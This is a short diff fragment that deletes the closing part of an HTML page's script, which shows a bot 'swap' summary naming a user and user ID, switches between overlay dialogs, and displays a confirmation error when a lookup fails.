-      document.getElementById('swapSummary').textContent =
-        `Bot will swap with @${user.name} (userId ${user.id})`;
-      closeOverlay('ovIsYou');
-      openOverlay('ovSwapIt');
-    };
-  } catch (e) {
-    closeOverlay('ovLooking');
-    document.getElementById('confirmErr').style.display = 'block';
-    openOverlay('ovConfirm');
-  }
-}
-</script>
-
-</body>
-</html>
+   
